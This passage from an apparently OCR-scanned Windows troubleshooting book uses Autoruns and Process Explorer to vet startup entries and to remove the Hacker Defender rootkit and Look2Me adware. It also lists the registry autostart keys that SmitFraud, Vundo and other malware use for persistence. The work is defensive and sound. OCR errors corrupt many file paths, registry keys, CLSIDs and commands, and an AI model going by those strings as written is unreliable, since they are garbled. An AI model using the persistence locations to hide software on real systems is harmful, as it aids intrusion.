dialog, so it is preferable to clicking Properties in the Autoruns context 
menu. 
9 
Google Google the entry (let Autoruns do a general search on the 
pkmcdo.dll file). 
9 
Search a database Focus your search by using one or more databases that 
specifically address the category this Registry location represents. In this 
case, the category is Protocols Handler. 

Examining Your Computer 9 Chapter 2 
77 
Search your computer for the file in all of its locations I usually do 
this via the command line by selecting Start I Run ! cmd I Enter. I 
then type cd\ to get to the root directory. Next, I search all directories and 
subdirectories for the file using the command dir/s/a/o-d <.filename>, and 
then I press Enter. 
As the last step, I upload the file to the Virus Total or Jotti single file virus 
scanner Web site" 
9 
Virus Total www.virustotal.com/flash/index_en.html 
9 Jotti http://virusscan.jotti.org 
Now I try the first option, which is to solicit Process Explorer for more infor- 
mation, since I have Process Explorer running and available. Process Explorer tells 
me that the file is not running, so unfortunately, no more information can be 
gleaned from that. Remember, Process Explorer lists only active processes. 
I examine my database list and see that CastleCops has a database dedicated to 
protocol handlers. Protocol handlers are listed under the Autoruns Explorer tab and 
under this heading in researchdb.txt (see http'//castlecops.com/O18.html)" 
3..Explorer 
Extra Protocol and Protocol ]Hijackers List 
I decide that searching this database is the best approach to take next, so I click 
on the link in my text file (I also could copy and paste the link into my browser's 
address bar). Fortunately, I see the database has an entry on this item. Figure 2.15 
shows the results. 
Figure 2.15 CastleCop's Extra Protocol and Protocol Hijackers List Search 
Result on pkmcdo.dll 
www.syngress.com 

78 
Chapter 2 9 Examining Your Computer 
CastleCops has the item listed as "L" which indicates that pkmcdo.dll is a legiti- 
mate system file; the "Not Verified" label is of no significance in terms of malware. 
Just to be safe, I decide to get a second opinion, since it is available to me by 
right-clicking the selected item in Autoruns and then clicking Google from its con- 
text menu. I see numerous entries, all of which support CastleCops' database conclu- 
sion. The "Accessing SharePoint Portal Server 2001 in .NET" Web page 
(www.c-sharpcorner.com/Code/2003/Feb/SPPIntroduction.asp) gives me an infor- 
mative description of the function of pkmcdo.dll, which is to "import SPP function- 
ality in your .NET application." 
I am confident that pkmcdo.dll is a legitimate Microsoft file, so I am no longer 
concerned about its malware potential. Therefore, I elect not to pursue any addi- 
tional steps in the troubleshooting sequence: case closed. 
Example 2 
In this example, we will analyze what is running behind an svchost and decide what 
action to take. 
Let's start by looking at the following Autoruns log entry: 
+ ShellHWDetection Generic Host Process for Win32 Services 
(Verified) 
Microsoft Windows Publisher c:\windows\system32\svchost.exe 
This translates to the following: 
Registry Location HKLM\SYSTEM\CurrentControlSet\ 
Services\ShellHWDetection 
9 
Service Name ShellHWDetection 
9 
Service Description Generic Host Process for Win32 Services 
9 
Publisher (Verified) Microsoft Corporation 
9 
Image Path C:\windows\system32\svchost.exe 
We can look at the image path for this item, which is C:\windows\system32\ 
svchost.exe. So, let's try to plug the process that is running, svchost.exe, into one of 
the startup databases. 
Neither the Bleeping Computer nor the CastleCops database has any entries 
that match the service name ShellHWDetection, so I settle for one of the entries 
that sounds pretty close to the service description: Generic Host Process for Win32 
Services. 

Examining Your Computer 9 Chapter 2 
79 
The Bleeping Computer and CastleCops databases have many entries for 
svchost.exe, and most of them are bad. I found one that comes close to matching the 
aforementioned description, but not exactly (see Figure 2.16). 
Figure 2.16 The Bleeping Computer Startup Database Report for svchost.exe 
The CastleCops Startup database entry that most closely matches the Autoruns 
description for the svchost.exe entry is shown in Figure 2.17. 
Figure 2.17 The svchost.exe Report from the CastleCops Startup Database 

80 
Chapter 2 9 Examining Your Computer 
Now, notice that each report says the legitimate svchost.exe is in the C:\win- 
dows\system32 folder that is in the path of svchost.exe in Autoruns, so I know that 
the entries I have selected that identify svchost.exe as malware are not correct. 
I ran through this exercise for a specific purpose: to demonstrate how easy it is 
to make a mistake when trying to identify a file, even with the research databases at 
your disposal. 
The svchost.exe file baffles many people. If you open the Task Manager, you can 
see several occurrences of svchost.exe running, and you may lump to the conclusion 
that it must be malware related. Some svchost.exe files are Trojan executables, but the 
fact is that C:\windows\system32\svchost.exe is a legitimate system file and it is 
normal to see multiple occurrences of svchost.exe running at once. (I have four 
instances of svchost.exe running on my system right now.) 
The authentic svchost.exe file is located in the %SystemRoot%\System32 folder, 
which is C:\windows\system32\ in most cases. When you boot your computer, 
svchost.exe examines the HKLM\SYSTEM\CurrentControlSet\Services\ Registry 
key, which specifies all the services that need to be loaded. This is the same Registry 
key we are researching in our Autoruns entry. The svchost.exe file organizes all the 
services into groups and stores each group in a separate value under the 
HKLM\Software\Microsoft\WindowsNT\CurrentVersion\Svchost Registry key. 
Each value, or group, is loaded by a separate svchost.exe file, which is why it is 
normal to see multiple svchost.exe files running at the same time in the list of active 
processes. 
Next, we will identify the process underlying svchost.exe. To do this we will 
lump to the Registry location in Autoruns to determine the actual DLL filename 
that svchost.exe loaded: 

Examining Your Computer 9 Chapter 2 
81 
. 
o 
Double-click the ShellHWDetection Autoruns entry. 
When at the proper Registry location, double-click Parameters ] 
Service DLL to open the value box that contains the filename of the ser- 
vice, %SystemRoot%\System32\shsvcs.dll (see Figure 2.18). In most cases, 
this will translate to C:\Windows\System32\shsvcs.dll. 
Figure 2.18 Decoding the Filename for ShellHWDetection by Inspecting the 
Parameters Value Data 
We just figured out the filename of the service the long way, but Process 
Explorer can identify the filename in a matter of seconds. To put Process Explorer to 
work, just follow these steps: 
1. Right-click the ShellHWDetection Autoruns entry. 
2. 
In the context menu that opens, select Process Explorer. 
3. In the Process Explorer Properties box, click Services. 
4. Locate ShellHWDetection in the group of services loaded by this 
svchost.You will see that the Display name for the service is Shell 
Hardware Detection. 
o 
Scroll to the right so that the path column is in view, and voila! Process 
Explorer identifies the filename right away as 
C: \ Windows \ System3 2 \ shsvcs, dll. 

82 
Chapter 2 9 Examining Your Computer 
Next, let's look up the service in one of the databases to see if it is essential. By 
essential, I mean whether it has to run in the background at all times. Let's use the 
ElderGeek Services Guide for Windows XP (www.theeldergeek.com/ 
services_guide.htm) to do this. If you look up Shell Hardware Detection, it says the 
service is supposed to be set to Automatic (see Figure 2.19). 
Figure 2.19 The ElderGeek Shell Hardware Detection Service Report 
Shell Hardware Detection Service 
.
.
.
.
 
. 
For a second opinion, I check the Black Viper SP2 Configurations at 
http" //web. archive, org/web/20041012031102/www.blackviper, com/WinXP/ser- 
vicecfg.htm. Black Viper concurs with ElderGeek, so I will leave the service running 
and set to Automatic. 
Example 3 
Now let's look at another Autoruns service entry that is also loaded by svchost.exe, 
called stisvc. I will break down the Autoruns log entry as follows: 
Registry Location HKLM\SYSTEM\CurrentControlSet\ 
Services\stisvc. 
9 
Service Name stisvc. 
9 Description Provides image acquisition services for scanners and cameras. 
9 
Publisher (Verified) Microsoft Corporation. 
9 
Image Path C:\windows\system32\svchost.exe. 

Examining Your Computer 9 Chapter 2 
83 
Here is the Autoruns log entry: 
+ stisvc Provides image acquisition services for scanners and cameras. 
(Verified) Microsoft Windows Publisher c:\windows\system32\svchost.exe 
The Autoruns log entry matches what appears on the display screen, except the 
+ (plus sign) precedes each entry under an autostart section which is not empty. This 
time we can eliminate the Autoruns step in figuring out what the DLL filename is 
and use Process Explorer to tell us that right away To do that, I right-click the 
Autoruns entry labeled as stisve. In the context menu that opens, I select Process 
Explorer. In the Process Explorer Properties box, I click Services. stisvc is dif- 
ferent from the previous example, in that it is not one of a group of services but is 
the only service launched by this svchost. We find that the display name for the ser- 
vice is Windows Image Acquisition (WIA). 
Next, I scroll to the right so that the path column is in view. I can see that 
Process Explorer identifies the filename as C:\Windows\System32\wiaservc.dll. 
Since I know the display name of the service is Windows Image Acquisition service, 
my next step is to check whether it has to be running in the background when I am 
not using my scanner or digital camera. 
I look at Black Viper's SP2 Service Configurations, which is in the database list, 
and I can see that by default, the service should be set to manual so that it doesn't 
consume valuable system resources when not in use (see Figure 2.20). 
Figure 2.20 Black Viper's SP2 Service Configurations Report on Windows 
Image Acquisition Service 

84 
Chapter 2 9 Examining Your Computer 
I double-check this result by referring to ElderGeek's Services Guide for 
Windows XP, also in the database list, at www.theeldergeek.com/services_guide.htm. 
ElderGeek also recommends setting the service to Manual. Since both sources 
agree, I can see it is safe to stop the service and set it to manual startup so that it 
won't consume valuable system resources unless it is required to do so. 
These services were easy to deal with because they were Verified Microsoft 
Services and were not malware related. Now, let's see how we would approach a 
malware service that requires more troubleshooting techniques. 
Example 4 
In this example, we will see how you can use Process Explorer to detect a rootkit 
that installs a malware service and a kernel driver. The rootkit is hxdef, which is a 
variant of Hacker Defender. Autoruns is able to spot the hxdef Registry autostart 
entries under Services for both the Hacker Defender service and the driver. 

Examining Your Computer 9 Chapter 2 
85 
Here is a summary of the steps we will follow to use AntiHookExec.exe in com- 
bination with Autoruns and Process Explorer for detecting hidden rootkit compo- 
nents: 
1. Download and install AntiHookExec.exe from 
www. s ec urity, org. sg/code/antiho okexe c. html. 
2. 
Change the PATH environment variable to include the AntiHookExec 
directory. 
3. 
Launch Autoruns and Process Explorer from the run line through 
AntiHookExec. 
4. 
View Autoruns for relevant hxdef entries. 
5. 
View Process Explorer for relevant hxdef entries. 
6. 
Stop and delete the hxdef service and then reboot. 
7. 
Delete hxdefEXE and SYS files/folders and Registry autostarts. 
8. 
Remove the malware payload (if present). 

86 
Chapter 2 9 Examining Your Computer 
Step 1" Download and Install AntiHookExec.exe 
You can download AntiHookExec.zip from unew.security, org.sg/code/antihookexec.html 
or www.bleepingcomputer.com/files/forensics/antihookexec.exe. Both these sources 
are listed in researchdb.txt on the Syngress Web site. Unzip AntiHookExec.zip to the 
C:\Program Files\. AntiHookExec will create its own folder during the install, called 
C:\Program Files\AntiHookExec\ folder. Verify that the folder was created and that 
AntiHookExec.exe is located in C'\Program 
Files \AntiH o okExe c \AntiH oo kExe c. exe. 
Step 2" Change the PATH Environment Variable 
In this step, you need to change the PATH environment variable to include the 
AntiHookExec directory. To do that, follow these steps: 
~ 
. 
Right-click My Computer I Advanced I Environment Variables. 
Under System Variables, double-click Path, and in the Edit box that 
opens append the following command to the end of the path variable 
val u e: 
;C: \Program Files\AntiHookExec\ 
Step 3" Launch Autoruns and Process Explorer 
To launch Autoruns and Process Explorer from the run line through AntiHookExec, 
follow these steps: 
1. Open a run-line box by selecting Start [ Run. 
2. To launch Autoruns through AntiHookExec, type the following command 
in the Open box (leave the quotes in, as quotes are required only when 
spaces exist in the file path)" 

Examining Your Computer 9 Chapter 2 
87 
AntiHookExec "C:\Program Files\Autoruns\autoruns" 
. 
To launch Process Explorer through AntiHookExec, type or paste the fol- 
lowing command in the Open box (leave the quotes in) 
AntiHookExec "C:\Program Files\Process Explorer\procexp" 
Notice that you can leave out the .exe file extension in the command and sub- 
stitute your own PATH for any security program or system analysis tool you care to 
run. For example, if you want to run HijackThis and the image path is 
C:\SecurityApps\Hijackthis.exe, the run-line command would be: 
AntiHookExec C: \SecurityApps\Hijackthis 
If the target utility path has spaces in it, you must surround it with quotes for 
the command to work properly. For example, if HijackThis.exe is located in the 
C:\Program Files\Hijackthis\ folder, the run-line command would be: 
AntiHookExec "C:\Program Files\Hijackthis\Hijackthis,, 
Since you do not have an hxdef-infected computer, you can just follow along 
with the evidence I present from this point onward. 
Step 4" View Autoruns for Relevant Entries 
At this point, you should view the Autoruns log run through AntiHookExec for rel- 
evant hxdef entries (see Figure 2.21). 
Figure 2.21 Autoruns Log Showing hxdef Service and Driver Startups 
www.syngress.com 

88 
Chapter 2 9 Examining Your Computer 
Figure 2.21 shows two hxdef service entries that I have extracted and marked 
with the following pointer: <~ HxDef Service. The entries are as follows: 
HKLM\System\CurrentControlSet\Services 
+ HackerDefenderl00 
powerful NT rootkit c:\documents and settings\neg\my 
documents\hxdef~hxdefl00.exe <~ HxDef Service 
HKLM\System\CurrentControlSet\Services 
HackerDefenderDrvl00 
c:\documents and settings\neg\my documents\hxde~hxdefdrv.sys <~ 
Hxdef Driver 
These entries indicate that Hacker Defender installs both a service called 
HackerDefenderl00 and a driver called HackerDefenderDrvl00. Neither log entry 
has a publisher, but the first service, hxdefl00.exe, has a description: 
"HackerDefenderl00 powerful NT rootkit". 
The second entry is a kernel device driver that the rootkit also installs. Hxdef 
uses a driver named hxdefdrv.sys, which make kernel-mode functions, such as 
hooking, available to the hxdefl00.exe program.The service called hxdefl00.exe is 
actually the Trojan running process (see Figure 2.22). 
Figure 2.22 Autoruns Driver Display Showing hxdefl00drv.sys (Hacker 
Defender Driver) 
Hxdef registers this process as a service so that it will start early in the boot 
sequence, even before a user logs on to Windows. 

Examining Your Computer 9 Chapter 2 
89 
This is what we know so far from Autoruns: 
Hxdef Service Autoruns entry: 
9 
Registry Location HKLM\SYSTEM\CurrentControlSet\ 
Services\HackerDefender 100 
9 
Service Name HackerDefenderl00 
9 
Description Powerful NT rootkit 
9 
Publisher None 
Image Path C:\documents and settings\neg\my 
documents\hxdetZhxdeflOO.exe 
Hxdef Driver Autoruns entry: 
9 
Registry Location HKLM\SYSTEM\CurrentControlSet\Services\ 
HackerD efenderD rv 100 
9 
Service Name HackerDefenderDrvl00 
9 
Description None 
9 
Publisher None 
9 
Image Path C:\documents and settings\neg\my 
documents\hxdef~hxdefdrv.sys 
We know the service names and the location of the files on disk, so we can 
delete the following files after disabling and deleting the service: 
C:\documents and settings\neg\my documents\hxdefX, hxdefdrv.sys 
C:\documents and settings\neg\my documents\hxdeta, hxdefl00.exe 
Our general approach will be to stop the hxdef service in Process Explorer and 
delete the files and folders associated with hxdef. Then we will return to Autoruns to 
remove the autostarts from the Registry. Now let's examine the Process Explorer 
hxdef evidence. 
www.syngress.com 

90 
Chapter 2 9 Examining Your Computer 
Step 5" View Process Explorer for Relevant Entries 
First, let's look at the Process Explorer log entries (see Figure 2.23). 
Figure 2.23 Process Explorer Log Showing Active Process, hxdeflOO.exe 
By examining Figures 2.23 and 2.24, you can see that WinLogon.exe is the parent 
process of hxdefl00.exe and that hxdefl00.exe has no description or company name 
associated with it. Since hxdefl00.exe is normally a hidden rootkit process, it does not 
attempt to camouflage itself by using a fake description or company name. 
Since we know hxdefl00.exe is a service, let's look at the Process Explorer dis- 
play as well (see Figure 2.24). 
Figure 2.24 Process Explorer Showing Running Service, hxdeflOO.exe 

Examining Your Computer 9 Chapter 2 
91 
The screen display shows the same information that the log does, except the 
pink highlighting tells us that hxdefl00.exe is a running service as opposed to just a 
running process. The lower pane is in Handle view, and it shows two threads run- 
ning from the hxdefl00 process. There is something interesting in the lower pane. 
The file path is listed as C:\windows\system32 even though the Autoruns log 
showed the hxdef driver and service was located in the Documents and Settings 
folder. This leads me to believe that hxdefl00.exe must copy itself and its driver to 
the Windows system directory so that it may achieve full functionality. 
Now let's right-click hxdefl00.exe and examine some of its properties in Process 
Explorer. First, we'll look at the Performance Graph (see Figure 2.25). 
Figure 2.25 Process Explorer Performance Graph for hxdefl00.exe 
We can see that hxdefl00.exe is loaded into memory, and that it is consuming 
only 1.1 MB of RAM. There is very little CPU activity, although the raw perfor- 
mance data does indicate there is some activity. Normally, Hacker Defender is associ- 
ated with a huge malware payload. It installs a backdoor that allows a remote 
attacker to maintain access and control over the infected system. Since this installa- 
tion was done on a virtual machine with VMWare, no associated malware payload is 
present and the rootkit process is relatively inactive. 

92 
Chapter 2 9 Examining Your Computer 
Now let's look at hxdefl00.exe's raw performance data.The raw performance 
data does indicate some minimal CPU activity, which is not visible in the 
Performance Graph (see Figure 2.26). 
Figure 2.26 Process Explorer Raw Performance Data for hxdeflOO.exe 
Step 6" Stop and Delete 
the hxdef Service, and Then Reboot 
To stop and delete the hxdef service, you select Services I Stop. This will end the 
running service from the Process Explorer hxdefl00 Properties dialog, as shown in 
Figure 2.27. 

Examining Your Computer 9 Chapter 2 
93 
Figure 2.27 Process Explorer Properties Dialog with hxdefl00.exe Service 
Displayed 
www.syngress.com 

94 
Chapter 2 9 Examining Your Computer 
Now you must reboot the computer to make the rootkit files visible to 
Windows for deletion in the next step. 
Step 7" Delete the hxdef Files and Registry Autostarts 
Now, we will manually delete the hxdef files and folders that we know about from 
the command line. We will also search for any additional hxdef files using a DOS 
command. We will use the following procedures to accomplish these two steps: 
1. Enable viewing of hidden files and folders. This is required if we were 
deleting the files from within Windows Explorer and the files to be deleted 
had the hidden attribute set. Here, the DOS command in step 4 d. takes 
care of the hidden attribute by specifying the/a switch. 
2. To be extra safe, delete these two files individually: 

Examining Your Computer 9 Chapter 2 
95 
. 
. 
C'\documents and settings\neg\my documents\hxdefXhxdefdrv.sys 
C'\documents and settings\neg\my documents\hxdefXhxdefl00.exe 
Remove the entire C:\documents and settings\neg\my documents\hxdetZ 
folder. 
From the command line, search for any files on disk with "hxdef" in their 
names. Select Start ] Run, type cmd, and click OK. Type cd\. Press 
Enter.Type dir/a/s hxdef*.*. Press Enter. Close the command prompt 
window. 
5. 
Delete any additional infected files or folders that the search reveals. 
If you experience trouble deleting stubborn files, there are numerous ways to get 
around that. Refer to Chapter 3 for the details. 
Now, we will return to Autoruns and disable the two hxdef service autostarts. To 
prevent these two service entries from restarting, right-click each one and select 
Delete from the context menu.You have now deleted the hxdefRegistry autostarts. 
Step 8" Remove the Malware Payload 
At this point, you should have removed the rootkit and prevented it from restarting 
after a reboot. If this were a real-life situation, hxdef would contain malware, 
meaning you would have to remove the malware payload once the rootkit was dis- 
abled. Since the system was compromised, there may be lingering after effects, 
including stolen passwords, identity theft, and Trojanized files. 
If you find a suspected "unknown file" on your system, always test it for its 
threat potential.You can do this by uploading the file to an online file scanner such 
as Virus Total or Jotti. The links to the scanners are in the database research file. Virus 
Total (www.virustotal.com/flash/index_en.html)and Jotti (http://virusscan.jotti.org) 
will employ about 20 different scanners each to get multiple opinions on the nature 
of the file. 

96 
Chapter 2 9 Examining Your Computer 
Example 5 
We have analyzed nonessential and essential startups, as well as malware that installs a 
service and a rootkit. This time we will examine malware that uses a nontraditional 
startup method. 
Look2Me is a highly intrusive adware program that displays pop-up advertise- 
ments and often redirects your Web browser. It also maintains an HTTP or FTP 
connection to download additional programs or components onto the infected com- 
puter. The Look2Me adware variant uses the WinLogon Notify key to install, so it 
runs whenever Windows starts. The DLL also hooks into explorer.exe, so it will run 
as long as a user is logged on to Windows. This makes removal difficult, even in safe 
mode. 
Few legitimate DLLs use the WinLogon Notify loading mechanism. Therefore, it 
is easy to determine whether the DLL is friendly by examining the CastleCops 
WinlogonNotify and Applnit_DLLs databases (http://castlecops.com/ 
O20.html). Almost all of the legitimate DLLs and many malware DLLs are listed. If the 
DLL is malicious but is randomly named, it will be impossible to find an exact match 
for the specific DLL in question. Consequently, if there is an unknown DLL in the 
WinLogon Notify run key which does not exist in the database, this definitely does not 
rule out malware. In fact, it probably is malware related, especially if it has a name 
composed mostly of random consonants. 
The best approach is to search Google for the entry and to upload the file to the 
Virus Total or Jotti multivirus scanners so that you can test it. Even if a file is mali- 
cious, if it is a brand-new variant, the antivirus signatures may not have been 
updated to detect it yet, so the scanners may report inconclusive results.You must 
explore many avenues when trying to determine the threat potential of an unknown 
or suspect file.You must correlate everything with the computer symptoms you are 
experiencing, too. A lot of computer forensics come into play when tackling a resis- 
tant and possibly new infection. 
To start, let's look at the Autoruns Display using the Winlogon tab (see 
Figure 2.28). 

Examining Your Computer 9 Chapter 2 
97 
Figure 2.28 Autoruns Display Showing the Look2Me Winlogon Notify 
Autostart Key 
In this case, Look2Me.dll is clearly identified as srdpapi.dll.A search of the 
CastleCops WinlogonNotify and Applnit_DLLs databases reveals no matching 
entries for this file, which is not surprising because of its random nature. This does 
not rule out malware. However, uploading the srdpapi.dll file to the Virus Total 
scanner clearly identifies the file as an ABetterlnternet adware variant. 
Two Look2Me entries are present in the Autoruns log, which I have extracted 
and indicated here: 
HKLM\Software\Microsoft\Windows\CurrentVersion\Shell 
Extensions \Approved 
+ srdpapi.dll c:\windows\system32\srdpapi.dll 
HKLM\SOFTWARE\Microsoft\Windows 
NT\CurrentVersion\Winlogon\Notify 
+ Uninstall c:\windows\system32\srdpapi.dll 
The first entry is the Registry entry that allows the program to run as a shell 
extension of explorer.exe. The second entry corresponds to the Winlogon\Notify 
key in the Autoruns WinLogon display. 
Select the Explorer tab in Autoruns. The highlighted entry corresponds to the 
Approved Shell Extensions Registry subkey for srdpap.dll in the Autoruns log (see 
Figure 2.29). 

98 
Chapter 2 9 Examining Your Computer 
Figure 2.29 Autoruns Display with Explorer Tab Selected 
When Windows starts, userinit.exe launches an Explorer shell and the Look2Me 
DLL is loaded along with it, as an Explorer shellExtension. 
Click on Process Explorer and examine the explorer.exe Properties dialog. 
By selecting the Threads tab, you can see that srdpapi.dU has rnultiple threads run- 
ning within the explorer.exe process (see Figure 2.30). 
Figure 2.30 Process Explorer Properties Dialog Showing explorer.exe Active 
Threads 

Examining Your Computer 9 Chapter 2 
99 
Look2Me injects the srdpapi.dll module into explorer.exe so that its threads can 
execute within the explorer.exe process. 
To remove Look2Me, we will first attempt to use the uninstall function which is 
built into the Look2Me DLL, and hopefully that will successfully remove the pro- 
gram. Before we do that, I want to show you how to use Process Explorer to deci- 
pher what program is being launched by rundl132.exe. The method is very similar to 
that used in Example 2, in which we used Process Explorer to decipher what was 
running behind svchost.exe. 
I will use an example that you can follow on your computer. In this example, 
the system will use rundl132 to launch the Date & Time Properties dialog on your 
desktop. First, we want to set Process Explorer so that the upper pane takes up the 
entire window. To do that, click View I Show Lower Pane (so that it is unchecked). 
Now the process tree will take up the entire screen. Focus on the bottom of the 
process tree, so you can see the rundl132 process enter in green when we execute the 
next step. 
Double-click the clock icon in the right-hand corner of your desktop display 
(see Figure 2.31). 
Figure 2.31 Digital Clock Display in the Taskbar 
This will open a Date & Time Properties window on your desktop.You should 
have seen the rundl132 process entering, as indicated by the green highlighting in the 
bottom of the Process Explorer process tree. Keep the Date & Time Properties 
window open (see Figure 2.32). 

100 
Chapter 2 9 Examining Your Computer 
Figure 2.32 Process Explorer Process Tree Showing rundl132.exe and the 
Date & Time Properties Window 
Right-click rundU32.exe in the process tree and select Properties I Image. In 
the Command line field (see Figure 2.33), you will see the command that launches 
the Date & Time dialog display, which is C:\WINDOWS\system32\ 
shel132.dll,Control_RunDLL timedate.cpl. 
Figure 2.33 Process Explorer Properties Dialog Showing Image Properties for 
rundl132.exe 

Examining Your Computer 9 Chapter 2 
101 
We can apply this same method to execute the Look2Me uninstall command. To 
uninstall Look2Me, we will specify uninstall as the function to execute in srdpapi.dll 
by issuing this command on the run line: 
C: \WINDOWS\system32\rundl132. exe"/d C: \WINDOWS\system32\srdpapi. dll, 
Uninstall 
You may question the efficacy of using an uninstall function which is provided 
by the very program we are trying to get rid of. The fact is, many adware programs 
do supply uninstallers or uninstall functions that effectively remove their programs 
without side effects. Commercial adware companies provide uninstallers to lend 
legitimacy to their products and minimize their potential liabilities.You should judge 
the effectiveness and trustworthiness of any uninstaller on a case-by-case basis. It so 
happens that the Look2Me uninstall function has been shown to be effective at 
removing certain variants, which is why I have opted to attempt that removal 
method first. 
If executing the Look2Me uninstall function failed to remove the Look2Me 
application, I would try the following alternative approach: 
1. In Process Explorer, suspend the explorer.exe, winlogon.exe, and 
rundl132.exe affected processes.You can do this through their context menu 
controls or via the Process Properties dialog. 
2. Remove the autostarts in Autoruns (right-click the Autoruns entry, and 
select Delete from the context menu). 
3. Delete the srdpapi.dll file. 
4. Follow up with an antivirus scan, preferably in safe mode. 
5. Turn the lower pane display back on in Process Explorer by clicking View 
I Show Lower Pane (Check). 
Because Look2Me is a Trojan downloader, it has other files and Registry changes 
associated with it.You have to remove some of those items manually and restore the 
Registry. In addition, you should perform an antivirus/antitrojan/antispyware scan in 
safe mode. Look2Me is a very tenacious infection and its removal is very difficult. To 
complicate matters, the removal method varies depending on which variant is 
involved. It is best to research complete removal instructions by Googling for 
Look2Me and/or the infective filename. Symantec has a threat database that contains 
removal instructions for most threats.You can find Symantec's Look2Me removal 
instructions at http"//sarc.com/avcenter/venc/data/adware.look2me.html. 
Another popular fix is routinely used on the online security forums to remove 
Look2Me. 

102 
Chapter 2 9 Examining Your Computer 
Other Examples of Malware 
That Uses Nontraditional Hidden 
Startups Locatable in Autoruns 
Malware writers continually adapt their infections to thwart currently known removal 
attempts. Therefore, they frequently introduce new variants that defy all current fixes. 
We have already discussed Look2Me's use of the WinLogon Notify key as a 
nontraditional startup. Now we will discuss another example of an infection that uses 
a nontraditional startup and frequently comes out with new variants, called the 
SmitFraud Trojan. 
The infection produces bogus taskbar security alerts emanating from a blinking 
system tray icon, which intentionally mimic those of Windows. Clicking on the alert 
bubble will take you to the corresponding rogue antispyware Web site corresponding 
to the SmitFraud variant involved, and silently download and install a rogue security 
product. When the product scans, it will detect the Trojan that installed it, but it will 
ask you to register its antispyware program to remove it, at a cost of more than $50. 
The phony security scanners have numerous names, such as SpywareQuake, SpyAxe, 
and SpyFalcon. The Trojan that generates the alerts is not distributed by its associated 
antispyware Web site, but by affiliate sites that receive compensation for each product 
sold. 
The SmitFraud Trojan 
Most of the Trojan variants in the SmitFraud group use an obscure autostart called 
the Shared Task Scheduler key, which is as follows: HKEY_LOCAL_MACHINE\ 
SO F TWARE \Microsoft\Windows \ C urrentVersion \Explorer\ Share dTaskS che duler. 
The Shared Task Scheduler key is used to load the SmitFraud infective DLL 
when Explorer is launched. This means it is always memory resident. A matching 
CLSID key is associated with the Shared Task Scheduler key and it must be regis- 
tered before it can be used. The following key registers the CLSID used to reference 
the Shared Task Scheduler key: HKEY_CUR.Rs 
CLSID\\{numerical CLSID }. 
You must also register BHOs using their CLSID in an analogous manner, by 
using this Registry key: HKEY_LOCAL_MACHINE\SOFTWARs 
Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects\ { numerical 
CLSID }. 
I mentioned BHOs because of the similarities involved in registering the CLSID 
of infected components, but SpywareQuake does not install a BHO to achieve its 
functionality. Based on our discussion earlier, the SmitFraud SpywareQuake variant 
www.syngress.com 

Examining Your Computer 9 Chapter 2 
103 
has these Registry keys associated with it, where the following string represents the 
CLSID of the Task Scheduler key: 
E2CA7CDI-IAD9-FIC4-3D2A-DCIA33E7AF9D 
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\Current 
Version \Explorer\ Share dTaskS che duler\ { E2 CA7 CD 1 - 1AD9-F 1C 4-3 D 2A- 
DC1A33ETAF9D} 
HKEY_CURRENT_USER\ SO F TWAKE \ Classes \ CLS ID k { E2 CA7 CD 1 
- 1ADg-F 
1 C4-3D2A-DC 1A33ETAFgD }] 
These two Registry keys are used in combination to register and launch the 
Trojan's infective DLL. The infective DLL is responsible for putting up the security 
alerts and secretly installing the SpywareQuake antispyware application. 
A traditional run key is also installed to launch the SpywareQuake antispyware 
application itself." 
HKEY_LOCAL_MACHINE\SOFTWAR~\Microsoft\Windows\CurrentVersion\ 
Run\\SpywareQuake.You must delete all of these autostart locations as part of the 
removal process. 
A program can employ a few mechanisms to make sure it runs in safe mode. If a 
program launches through the following autostart locations and an asterisk (*) pre- 
cedes the value, the program will run even in safe mode: 
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\ 
CurrentVersion\Run 
HKEY_CURRENT_USER\Software\Microsoft\Windows\ 
CurrentVersion\Run 

104 
Chapter 2 9 Examining Your Computer 
The HackDoor rootkit and other malware set these two Registry keys to ensure 
they run in safe mode: 
HKEY_LO CAL_MAC H I NE \SYSTEM\ Current ControlS et \ Control\ 
SafeBoot\Minimal 
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\ 
SafeBoot\Network 
Microsoft also uses the first key to ensure that required Windows services run in 
safe mode. 
The Vundo Trojan 
The last example of malware that we will discuss that uses a nontraditional autostart 
is the Vundo Trojan. From an operational perspective, the Vundo Trojan is analogous 
to that of the SmitFraud Trojan. It uses a fake security alert to try to goad you into 
purchasing one of its several antispyware products, such as WinFixer, 
WinAntispyware, WinAntivirus, and its latest rogue application, SysProtect. 
Vundo installs two autostarts--one a WinLogon Notify and the other a BHO-- 
that reference the same randomly named infective DLL file. These autostarts are 
classic symptoms of Vundo and come in pairs that resemble the following: 
9 BHO Registry entries 
H KEY_L O CAL_MAC HINE \ SO F TWARE \ Classes \ CLS ID \ 
{Vundo BHO CLSID}\InprocServer32\<Vundo DLL filename> and 
HKEY_L O CAL_MAC H I NE \SO F TWARE \Microsoft\Windows \ Current 
Version\Explorer\Browser Helper Objects\ {Vundo BHO CLSID 
9 WinLogon key with matching random DLL filename reference 
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows 
NT\CurrentVersion\Winlogon\Notify\<Vundo DLL filename > 
\Startup:"SysLogon" 
\Logoff: "SysLogoff" 
Many other files are associated with a Vundo infection, and you must uninstall 
them as well. 
Using File Compare in Autoruns 
to Diagnose Changes in Startups 
When you know your computer is clean and is running well, you should establish a 
baseline for your system so that you can take advantage of Autoruns' File Compare 

Examining Your Computer 9 Chapter 2 
105 
feature. File comparison automatically flags autostart differences that have occurred 
over time.You can thoroughly research these differences to determine their cause 
and to rule out a malware association. 
Here are the steps to follow to compare files: 
~ 
Take a baseline snapshot of your system startups by selecting File I Save, 
in the Autoruns menu. 
2. 
Change the default filename to one that includes a date stamp so that the 
file is permanently saved. 
3. 
To see whether malware may have been added, select File I Compare to 
compare the current log to the earlier baseline snapshot. 
4. 
Determine to what the file comparison differences are attributable. 
5. 
Remove any unwanted program startups and their associated program 
components. 
Most Common Malware Starting Locations 
Symantec has compiled a list of the most common autostarts used to launch malware 
programs. These autostarts do not represent the most common startups used by legit- 
imate programs. Rather, many of these autostarts are selected to be obscure, to 
thwart currently used detection and removal techniques. 
HKEY_CURRENT_USER\Software\Microsoft\Windows\ 
CurrentVersion\Run 
HKEY CURRENT 
USER\Software\Microsoft\WindowsNT\ 
CurrentVersion\Windows 
HKEY_CURRENT_USER\Software\Microsoft\Windows\ 
CurrentVersion\Policies\Explorer\Run 
HKEY_CURRENT_USER\Software\Microsoft\Windows\ 
